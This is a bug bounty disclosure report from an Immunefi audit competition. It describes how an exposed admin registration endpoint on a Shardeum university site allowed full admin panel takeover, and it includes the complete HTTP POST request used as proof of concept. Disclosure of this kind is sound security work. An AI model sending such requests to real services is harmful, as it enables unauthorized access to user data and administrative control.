# #35452 \[W\&A-High] Admin Panel Accessed

**Submitted on Sep 23rd 2024 at 09:52:08 UTC by @blocksmith0 for** [**Audit Comp | Shardeum: Ancillaries II**](https://immunefi.com/audit-competition/shardeum-ancillaries-ii-boost)

* **Report ID:** #35452
* **Report Type:** Websites and Applications
* **Report severity:** High
* **Target:** <https://immunefi.com>
* **Impacts:**
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information, Commenting, Voting, Making trades, Withdrawals, etc.

## Description

## Vulnerability Details

I was able to completely takeover university admin panel on \`dash.university.shardeum.org\` this gives me full access to block unblock almost 20K users, view their data I also have full access to all courses to delete them completely also I can delete other admin accounts as well.

## Proof of Concept

## Proof of Concept

The was possible because the following admin registration API endpoint was available which enabled me to register an admin account and then login to that admin account.

To register an admin account do a POST request to the following HTTP request with your email and password.

\`\`\` POST /api/admin/register HTTP/1.1 Host: api.university.shardeum.org Connection: close sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121" Accept: application/json, text/plain, */* sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 sec-ch-ua-platform: "Linux" Origin: <https://university.shardeum.org> Sec-Fetch-Site: same-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: <https://university.shardeum.org/> Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 If-None-Match: W/"b49-ha6cnPGQKUWujk1808h938ZMeIo" Content-Length: 58 Content-Type: application/json

{"adminEmail":"\*\*\*","password":"teset456"}\` \`\`\` To confirm the PoC please check the admin I have registered with the email \`\*\*\*\` on \`administrators\` section

Please see the screenshots for more info.
